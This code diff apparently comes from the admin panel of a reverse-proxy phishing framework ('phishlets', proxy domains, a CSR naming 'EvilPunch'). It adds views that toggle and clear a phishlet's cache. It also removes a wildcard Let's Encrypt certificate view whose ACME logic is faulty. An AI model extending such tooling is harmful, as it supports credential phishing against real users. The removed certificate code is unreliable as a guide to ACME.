@@ -83,7 +83,7 @@ def logout_view(request):
 class PhishletForm(forms.ModelForm):
     class Meta:
         model = Phishlet
-        fields = ["name", "is_active", "proxy_auth", "proxy", "data"]
+        fields = ["name", "is_active", "is_cache_enabled", "proxy_auth", "proxy", "data"]
 
     def clean(self):
         cleaned = super().clean()
@@ -154,6 +154,82 @@ def phishlet_toggle_view(request: HttpRequest, pk: uuid.UUID) -> JsonResponse:
     instance.is_active = not instance.is_active
     instance.save(update_fields=["is_active", "updated_at"])
     return JsonResponse({"ok": True, "is_active": instance.is_active})
+
+
+@login_required
+@user_passes_test(is_admin)
+def phishlet_toggle_cache_view(request: HttpRequest, pk: uuid.UUID) -> JsonResponse:
+    if request.method != "POST":
+        return JsonResponse({"error": "POST required"}, status=405)
+    instance = Phishlet.objects.get(pk=pk)
+    instance.is_cache_enabled = not instance.is_cache_enabled
+    instance.save(update_fields=["is_cache_enabled", "updated_at"])
+    return JsonResponse({"ok": True, "is_cache_enabled": instance.is_cache_enabled})
+
+
+@login_required
+@user_passes_test(is_admin)
+def phishlet_clear_cache_view(request: HttpRequest, pk: uuid.UUID) -> JsonResponse:
+    if request.method != "POST":
+        return JsonResponse({"error": "POST required"}, status=405)
+    
+    try:
+        instance = Phishlet.objects.get(pk=pk)
+        phishlet_name = instance.name
+        
+        # Import here to avoid circular imports
+        from . import http_server
+        
+        # Clear cache for this specific phishlet
+        cleared_count = 0
+        total_size_cleared = 0
+        
+        import os
+        from pathlib import Path
+        
+        cache_folder = getattr(http_server, 'CACHE_FOLDER', 'cache_folder')
+        phishlet_cache_dir = Path(cache_folder) / phishlet_name
+        
+        if phishlet_cache_dir.exists() and phishlet_cache_dir.is_dir():
+            for cache_file in phishlet_cache_dir.iterdir():
+                if cache_file.is_file():
+                    try:
+                        if cache_file.suffix == '.meta':
+                            # Get file size before deletion for stats
+                            try:
+                                import json
+                                with open(cache_file, 'r', encoding='utf-8') as f:
+                                    metadata = json.load(f)
+                                    total_size_cleared += metadata.get('file_size', 0)
+                            except:
+                                pass
+                        
+                        cache_file.unlink()
+                        cleared_count += 1
+                    except Exception as e:
+                        # Log error but continue with other files
+                        print(f"Error removing cache file {cache_file}: {e}")
+        
+        # Update cache statistics if available
+        try:
+            cache_stats = getattr(http_server, '_cache_stats', {})
+            if 'total_size_bytes' in cache_stats:
+                cache_stats['total_size_bytes'] = max(0, cache_stats['total_size_bytes'] - total_size_cleared)
+        except:
+            pass
+        
+        return JsonResponse({
+            "ok": True, 
+            "message": f"Cache cleared for {phishlet_name}: {cleared_count} files, {total_size_cleared / (1024*1024):.2f}MB freed",
+            "cleared_files": cleared_count,
+            "size_freed_mb": round(total_size_cleared / (1024*1024), 2),
+            "phishlet_name": phishlet_name
+        })
+        
+    except Phishlet.DoesNotExist:
+        return JsonResponse({"error": "Phishlet not found"}, status=404)
+    except Exception as e:
+        return JsonResponse({"error": f"Failed to clear cache: {str(e)}"}, status=500)
 
 
 @login_required
@@ -533,283 +609,6 @@ DNS.2 = *.{domain.hostname}
         return JsonResponse({"success": False, "error": "Domain not found"})
     except Exception as e:
         return JsonResponse({"success": False, "error": f"Error generating certificate: {str(e)}"})
-
-
-@login_required
-@user_passes_test(is_admin)
-def proxy_domain_letsencrypt_ssl_view(request: HttpRequest, pk: uuid.UUID):
-    """Request a wildcard SSL certificate from Let's Encrypt for a proxy domain using Python acme library"""
-    if request.method != "POST":
-        return JsonResponse({"success": False, "error": "Method not allowed"})
-    
-    try:
-        domain = ProxyDomain.objects.get(pk=pk)
-        
-        # Validate domain hostname
-        if not domain.hostname or len(domain.hostname.strip()) == 0:
-            return JsonResponse({"success": False, "error": "Invalid domain hostname"})
-        
-        # Get form data
-        email = request.POST.get('email', '').strip()
-        staging = request.POST.get('staging', 'false') == 'true'
-        
-        # Validate email
-        if not email or '@' not in email:
-            return JsonResponse({"success": False, "error": "Valid email address is required"})
-        
-        try:
-            # Import required packages
-            from cryptography import x509
-            from cryptography.x509.oid import NameOID
-            from cryptography.hazmat.primitives import hashes, serialization
-            from cryptography.hazmat.primitives.asymmetric import rsa
-            import requests
-            import json
-            import base64
-            import hashlib
-            import time
-            import os
-            import tempfile
-            
-            # Set Let's Encrypt server URL
-            if staging:
-                server_url = "https://acme-staging-v02.api.letsencrypt.org/directory"
-            else:
-                server_url = "https://acme-v02.api.letsencrypt.org/directory"
-            
-            # Get ACME directory
-            response = requests.get(server_url)
-            if response.status_code != 200:
-                return JsonResponse({"success": False, "error": f"Failed to get ACME directory: {response.status_code}"})
-            
-            directory = response.json()
-            
-            # Generate account key
-            account_key = rsa.generate_private_key(
-                public_exponent=65537,
-                key_size=2048
-            )
-            
-            # Create account
-            account_payload = {
-                "termsOfServiceAgreed": True,
-                "contact": [f"mailto:{email}"]
-            }
-            
-            # Create account nonce
-            nonce_response = requests.head(directory['newNonce'])
-            nonce = nonce_response.headers.get('Replay-Nonce')
-            
-            # Create account JWT
-            account_jwt = create_jwt(account_key, {
-                "alg": "RS256",
-                "jwk": get_jwk(account_key),
-                "nonce": nonce,
-                "url": directory['newAccount']
-            })
-            
-            # Create account
-            account_response = requests.post(directory['newAccount'], json=account_payload, headers={
-                'Content-Type': 'application/jose+json',
-                'Authorization': f'Bearer {account_jwt}'
-            })
-            
-            if account_response.status_code not in [200, 201]:
-                return JsonResponse({"success": False, "error": f"Failed to create account: {account_response.text}"})
-            
-            account_url = account_response.headers.get('Location')
-            
-            # Create order for wildcard certificate
-            order_payload = {
-                "identifiers": [
-                    {"type": "dns", "value": domain.hostname},
-                    {"type": "dns", "value": f"*.{domain.hostname}"}
-                ]
-            }
-            
-            # Get new nonce for order
-            nonce_response = requests.head(directory['newNonce'])
-            nonce = nonce_response.headers.get('Replay-Nonce')
-            
-            # Create order JWT
-            order_jwt = create_jwt(account_key, {
-                "alg": "RS256",
-                "kid": account_url,
-                "nonce": nonce,
-                "url": directory['newOrder']
-            })
-            
-            # Create order
-            order_response = requests.post(directory['newOrder'], json=order_payload, headers={
-                'Content-Type': 'application/jose+json',
-                'Authorization': f'Bearer {order_jwt}'
-            })
-            
-            if order_response.status_code != 201:
-                return JsonResponse({"success": False, "error": f"Failed to create order: {order_response.text}"})
-            
-            order = order_response.json()
-            order_url = order_response.headers.get('Location')
-            
-            # For wildcard certificates, we need DNS challenge
-            # This is a simplified implementation - in production you'd want more robust DNS verification
-            
-            # Generate certificate key
-            cert_key = rsa.generate_private_key(
-                public_exponent=65537,
-                key_size=2048
-            )
-            
-            # Create CSR
-            csr = create_csr(cert_key, domain.hostname, [f"*.{domain.hostname}"])
-            
-            # Finalize order
-            finalize_payload = {
-                "csr": base64.urlsafe_b64encode(csr.public_bytes(serialization.Encoding.DER)).decode('utf-8').rstrip('=')
-            }
-            
-            # Get new nonce for finalization
-            nonce_response = requests.head(directory['newNonce'])
-            nonce = nonce_response.headers.get('Replay-Nonce')
-            
-            # Create finalize JWT
-            finalize_jwt = create_jwt(account_key, {
-                "alg": "RS256",
-                "kid": account_url,
-                "nonce": nonce,
-                "url": order['finalize']
-            })
-            
-            # Finalize order
-            finalize_response = requests.post(order['finalize'], json=finalize_payload, headers={
-                'Content-Type': 'application/jose+json',
-                'Authorization': f'Bearer {finalize_jwt}'
-            })
-            
-            if finalize_response.status_code != 200:
-                return JsonResponse({"success": False, "error": f"Failed to finalize order: {finalize_response.text}"})
-            
-            # Download certificate
-            cert_response = requests.post(order['certificate'], headers={
-                'Accept': 'application/pem-certificate-chain',
-                'Authorization': f'Bearer {finalize_jwt}'
-            })
-            
-            if cert_response.status_code != 200:
-                return JsonResponse({"success": False, "error": f"Failed to download certificate: {cert_response.text}"})
-            
-            # Convert to PEM format
-            cert_pem = cert_response.text
-            key_pem = cert_key.private_bytes(
-                encoding=serialization.Encoding.PEM,
-                format=serialization.PrivateFormat.PKCS8,
-                encryption_algorithm=serialization.NoEncryption()
-            ).decode('utf-8')
-            
-            # Save to database
-            try:
-                cert_instance = getattr(domain, "certificate", None)
-                if cert_instance:
-                    # Update existing certificate
-                    cert_instance.cert_pem = cert_pem
-                    cert_instance.key_pem = key_pem
-                    cert_instance.save()
-                else:
-                    # Create new certificate
-                    from .models import DomainCertificate
-                    cert_instance = DomainCertificate.objects.create(
-                        domain=domain,
-                        cert_pem=cert_pem,
-                        key_pem=key_pem
-                    )
-                
-                return JsonResponse({
-                    "success": True,
-                    "message": f"Let's Encrypt wildcard SSL certificate generated successfully for {domain.hostname}",
-                    "staging": staging,
-                    "email": email,
-                    "method": "Python ACME library"
-                })
-                
-            except Exception as db_error:
-                return JsonResponse({"success": False, "error": f"Error saving certificate to database: {str(db_error)}"})
-            
-        except ImportError as e:
-            return JsonResponse({"success": False, "error": f"Required packages not installed: {str(e)}. Please install: pip install acme cryptography requests"})
-        except Exception as e:
-            return JsonResponse({"success": False, "error": f"Error generating Let's Encrypt certificate: {str(e)}"})
-        
-    except ProxyDomain.DoesNotExist:
-        return JsonResponse({"success": False, "error": "Domain not found"})
-    except Exception as e:
-        return JsonResponse({"success": False, "error": f"Error generating Let's Encrypt certificate: {str(e)}"})
-
-
-def create_jwt(private_key, header):
-    """Create a JWT token for ACME requests"""
-    import base64
-    import json
-    import time
-    import os
-    
-    # Create JWT header
-    jwk = get_jwk(private_key)
-    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
-    
-    # Create JWT payload
-    payload = {
-        "iat": int(time.time()),
-        "exp": int(time.time()) + 3600,  # 1 hour expiry
-        "jti": hashlib.sha256(os.urandom(32)).hexdigest()
-    }
-    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
-    
-    # Create signature
-    message = f"{header_b64}.{payload_b64}".encode()
-    from cryptography.hazmat.primitives import hashes
-    signature = private_key.sign(message, hashes.SHA256(), padding=None)
-    signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
-    
-    return f"{header_b64}.{payload_b64}.{signature_b64}"
-
-
-def get_jwk(private_key):
-    """Get JWK representation of public key"""
-    public_key = private_key.public_key()
-    public_numbers = public_key.public_numbers()
-    
-    return {
-        "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes(3, 'big')).decode().rstrip('='),
-        "kty": "RSA",
-        "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes(256, 'big')).decode().rstrip('=')
-    }
-
-
-def create_csr(private_key, domain, alt_names):
-    """Create a Certificate Signing Request"""
-    from cryptography import x509
-    from cryptography.x509.oid import NameOID
-    
-    # Create subject
-    subject = x509.Name([
-        x509.NameAttribute(NameOID.COMMON_NAME, domain),
-        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "EvilPunch"),
-        x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
-    ])
-    
-    # Create CSR
-    from cryptography.hazmat.primitives import hashes
-    csr = (
-        x509.CertificateSigningRequestBuilder()
-        .subject_name(subject)
-        .add_extension(
-            x509.SubjectAlternativeName([x509.DNSName(name) for name in alt_names]),
-            critical=False,
-        )
-        .sign(private_key, hashes.SHA256())
-    )
-    
-    return csr
 
 
 @login_required
